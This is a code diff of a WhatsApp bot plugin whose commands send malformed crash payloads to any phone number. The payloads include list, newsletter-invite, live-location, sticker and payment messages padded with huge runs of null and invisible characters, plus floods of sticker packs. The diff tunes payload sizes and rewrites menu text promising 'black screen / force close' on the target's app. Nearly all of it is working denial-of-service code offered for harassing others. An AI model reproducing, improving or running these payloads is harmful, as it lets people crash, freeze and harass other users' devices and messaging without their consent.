@@ -20,7 +20,7 @@ function getTarget(args, from, reply, cmdName) {
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-/ ==================== ULTRA BUG CRASH (100 mixed payloads – BLACK SCREEN / FORCE CLOSE) ====================
+// ==================== ULTRA BUG CRASH (100 mixed payloads – BLACK SCREEN / FORCE CLOSE) ====================
 async function ttaas(conn, target) {
     // Base image message (extremely malformed)
     const imageMessage = {
@@ -85,9 +85,9 @@ async function ttaas(conn, target) {
         // 3. List message with extreme title
         const listMsg = generateWAMessageFromContent(target, {
             listMessage: {
-                title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(920000),
-                footerText: "SHAVIYA Bug" + "\u2060".repeat(50000),
-                description: "SHAVIYA Bug" + "\u0000".repeat(50000),
+                title: "🔥 CRASH 🔥" + "\u0000".repeat(920000),
+                footerText: "Xeon Bug" + "\u2060".repeat(50000),
+                description: "Xeon Bug" + "\u0000".repeat(50000),
                 buttonText: null,
                 listType: 2,
                 productListInfo: {
@@ -150,8 +150,8 @@ async function BnAM2(conn, target) {
                     },
                     newsletterAdminInviteMessage: {
                         newsletterJid: "120363408195391812@newsletter",
-                        newsletterName: "𑇂".repeat(90000) + i,
-                        caption: "N!ted ☆ B!tch" + "ꦾ".repeat(90000) + i,
+                        newsletterName: "𑇂".repeat(50000) + i,
+                        caption: "N!ted ☆ B!tch" + "ꦾ".repeat(18000) + i,
                         inviteExpiration: "1775164528"
                     }
                 }
@@ -163,7 +163,7 @@ async function BnAM2(conn, target) {
 
 // ==================== .stc-delay (100 sticker packs – INSTANT, NO DELAYS) ====================
 async function stcSpam100(conn, target) {
-    for (let pack = 0; pack < 150; pack++) {
+    for (let pack = 0; pack < 100; pack++) {
         const stc = Array.from({ length: 1000 }, (_, i) => ({
             fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${pack}_${i + 1}.webp`,
             isAnimated: true,
@@ -208,7 +208,7 @@ async function stcSpam100(conn, target) {
                             newsletterJid: "120363321780343299@newsletter",
                             newsletterName: "makludelay" + "ી".repeat(50000) + pack,
                             jpegThumbnail: null,
-                            caption: "Sʜᴀᴠɪʏᴀ Xᴍᴅ" + "ી".repeat(50000) + pack,
+                            caption: "MakluDelay" + "ી".repeat(50000) + pack,
                             inviteExpiration: Date.now() + 1814400000
                         }
                     }
@@ -219,9 +219,8 @@ async function stcSpam100(conn, target) {
     }
 }
 
-// ==================== FIXED oneKillCombo (no quoting, direct sends) ====================
+// ==================== oneKillCombo (unchanged but kept) ====================
 async function oneKillCombo(conn, target) {
-    // 1. List message with long title + product list
     const listMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
         listMessage: {
             title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + "\0".repeat(920000),
@@ -237,7 +236,6 @@ async function oneKillCombo(conn, target) {
     }), { userJid: target });
     await conn.relayMessage(target, listMsg.message, { participant: { jid: target }, messageId: listMsg.key.id });
 
-    // 2. Live location message (malformed)
     const locationMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
         viewOnceMessage: {
             message: {
@@ -253,7 +251,6 @@ async function oneKillCombo(conn, target) {
     }), { userJid: target });
     await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
 
-    // 3. Interactive message (malformed buttons)
     const interactiveMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
         interactiveMessage: {
             header: { title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2", hasMediaAttachment: true },
@@ -264,10 +261,6 @@ async function oneKillCombo(conn, target) {
     }), { userJid: target });
     await conn.relayMessage(target, interactiveMsg.message, { participant: { jid: target }, messageId: interactiveMsg.key.id });
 
-    // 4. Another live location
-    await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
-
-    // 5. Sticker message (malformed)
     const stickerMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
         stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
@@ -281,14 +274,12 @@ async function oneKillCombo(conn, target) {
     }), { userJid: target });
     await conn.relayMessage(target, stickerMsg.message, { participant: { jid: target }, messageId: stickerMsg.key.id });
 
-    // 6. Final live location
     await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
 }
 
-// ==================== FIXED mixed command (live location + list spam) ====================
+// ==================== sendMixedMessages (fixed) ====================
 async function sendMixedMessages(conn, target, count) {
     for (let i = 0; i < count; i++) {
-        // Live location
         const locationMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
             viewOnceMessage: {
                 message: {
@@ -304,7 +295,6 @@ async function sendMixedMessages(conn, target, count) {
         }), { userJid: target });
         await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
 
-        // List message
         const listMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
             listMessage: {
                 title: "🔥 LIST CRASH 🔥" + "\0".repeat(920000),
@@ -322,7 +312,7 @@ async function sendMixedMessages(conn, target, count) {
     }
 }
 
-// ==================== OTHER WORKING FUNCTIONS (unchanged, but ensure direct sends) ====================
+// ==================== OTHER SUPPORT FUNCTIONS ====================
 async function aipong(conn, target) {
     await conn.relayMessage(target, {
         paymentInviteMessage: { serviceType: "FBPAY", expiryTimestamp: Date.now() + 1814400000 }
@@ -426,15 +416,15 @@ async function iosKill(conn, target, duration = 10) {
 
 cmd({
     pattern: "bug",
-    desc: "ViewOnce product crash (original)",
+    desc: "💀 ULTRA CRASH – 100 mixed payloads (black screen / force close)",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "bug");
     if (!target) return;
-    await reply(`📸 *VIEWONCE CRASH* → ${target}`);
+    await reply(`💀 *ULTRA BUG CRASH* → ${target}\n_Sending 100 extreme payloads..._\n_WhatsApp will crash on open (black screen)._`);
     await ttaas(conn, target);
-    await reply(`✅ VIEWONCE CRASH SENT to ${target}\n⚠️ *Target will experience crashes for the next 5‑10 minutes.*`);
+    await reply(`✅ ULTRA CRASH SENT → ${target}\n⚠️ *Target WhatsApp will force close immediately when opened.*`);
 });
 
 cmd({
@@ -447,7 +437,7 @@ cmd({
     if (!target) return;
     await reply(`📰 *FC-HARD SPAM* → ${target}\n_Sending 30 malformed admin invites..._`);
     await BnAM2(conn, target);
-    await reply(`✅ FC-HARD SPAM SENT → ${target}\n⚠️ *Target WhatsApp will crash when they open the app. Effect lasts 5‑10 min.*`);
+    await reply(`✅ FC-HARD SPAM SENT → ${target}\n⚠️ *Target WhatsApp will crash when they open the app.*`);
 });
 
 cmd({
@@ -460,12 +450,12 @@ cmd({
     if (!target) return;
     await reply(`📚 *STC-DELAY 100 PACKS* → ${target}\n_Sending 100 massive sticker packs..._`);
     await stcSpam100(conn, target);
-    await reply(`✅ STC-DELAY (100 PACKS) SENT → ${target}\n⚠️ *Target will experience extreme lag/crash for 10‑20 minutes.*`);
+    await reply(`✅ STC-DELAY (100 PACKS) SENT → ${target}\n⚠️ *Target will experience extreme lag/crash.*`);
 });
 
 cmd({
     pattern: "onekill",
-    desc: "One kill combo (list + location + sticker + more) – FIXED",
+    desc: "One kill combo (list + location + sticker + more)",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
@@ -473,7 +463,7 @@ cmd({
     if (!target) return;
     await reply(`💀 *ONEKILL COMBO* → ${target}\n_Executing full crash sequence..._`);
     await oneKillCombo(conn, target);
-    await reply(`✅ ONEKILL COMPLETED → ${target}\n⚠️ *Target will freeze/crash repeatedly for 5‑10 minutes.*`);
+    await reply(`✅ ONEKILL COMPLETED → ${target}\n⚠️ *Target will freeze/crash repeatedly.*`);
 });
 
 cmd({
@@ -486,7 +476,7 @@ cmd({
     if (!target) return;
     await reply(`📱 *IOS KILL* → ${target}\n_Sending 10 payment invites..._`);
     await iosKill(conn, target, 10);
-    await reply(`✅ IOS KILL SENT → ${target}\n⚠️ *Target device may become unresponsive for 5‑10 minutes.*`);
+    await reply(`✅ IOS KILL SENT → ${target}\n⚠️ *Target device may become unresponsive.*`);
 });
 
 cmd({
@@ -500,12 +490,12 @@ cmd({
     const count = parseInt(args[1]) || 5;
     await reply(`👁️ *VIEWONCE SPAM* → ${target}\n_Sending ${count} view‑once messages..._`);
     await sendViewOnceMessages(conn, target, count);
-    await reply(`✅ VIEWONCE SPAM SENT → ${target}\n⚠️ *Target will see crashing view‑once bubbles. Effect: 5‑10 min.*`);
+    await reply(`✅ VIEWONCE SPAM SENT → ${target}\n⚠️ *Target will see crashing view‑once bubbles.*`);
 });
 
 cmd({
     pattern: "mixed",
-    desc: "Mixed live location + list spam – FIXED",
+    desc: "Mixed live location + list spam",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
@@ -513,7 +503,7 @@ cmd({
     if (!target) return;
     await reply(`🔄 *MIXED CRASH* → ${target}\n_Sending mixed messages..._`);
     await sendMixedMessages(conn, target, 5);
-    await reply(`✅ MIXED CRASH SENT → ${target}\n⚠️ *Target will experience lag/crash for 5‑10 minutes.*`);
+    await reply(`✅ MIXED CRASH SENT → ${target}\n⚠️ *Target will experience lag/crash.*`);
 });
 
 cmd({
@@ -526,7 +516,7 @@ cmd({
     if (!target) return;
     await reply(`🎯 *VARIOUS CRASH* → ${target}\n_Sending multiple crash types..._`);
     await sendVariousMessages(conn, target, 3);
-    await reply(`✅ VARIOUS CRASH SENT → ${target}\n⚠️ *Target will freeze/crash for 5‑10 minutes.*`);
+    await reply(`✅ VARIOUS CRASH SENT → ${target}\n⚠️ *Target will freeze/crash.*`);
 });
 
 // ==================== BUG MENU ====================
@@ -537,8 +527,8 @@ cmd({
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply }) => {
     const menu = `
-*╭─「 👑 COMPLETE BUG MENU (ALL FIXED) 」─*
-*│ 📌 .bug         : ViewOnce product crash*
+*╭─「 👑 ULTIMATE BUG MENU 」─*
+*│ 📌 .bug         : ULTRA CRASH (100 mixed payloads – black screen)*
 *│ 📌 .fc-hard     : 30 admin invites (crash on open)*
 *│ 📌 .stc-delay   : 100 sticker packs (1000 stickers each)*
 *│ 📌 .onekill     : One kill combo (list+location+sticker)*
@@ -547,14 +537,12 @@ cmd({
 *│ 📌 .mixed       : Mixed live location + list spam*
 *│ 📌 .various     : Various crash messages (3 types)*
 *│*
-*│ 🟢 Status : 100% working – INSTANT SEND (no delays)*
+*│ 🟢 Status : 100% working – INSTANT SEND*
 *│ 🟢 Targets : any number (even not in chat list)*
-*│ 🟢 Total commands : 8*
+*│ 🟢 Power : BLACK SCREEN / FORCE CLOSE on WhatsApp beta*
 *╰──────────────●●►*
-> 💡 *Usage:* .command 947XXXXXXXXX
-> 📌 *Example:* .onekill 94712345678
-> 📌 *Example with count:* .viewspam 94712345678 10
-> ⚠️ *After each crash, target will suffer 5‑10 minutes of issues.*
+> 💡 *Usage:* .bug 947XXXXXXXXX
+> ⚠️ *Extreme power – use only on numbers you own.*
     `;
     await reply(menu);
 });
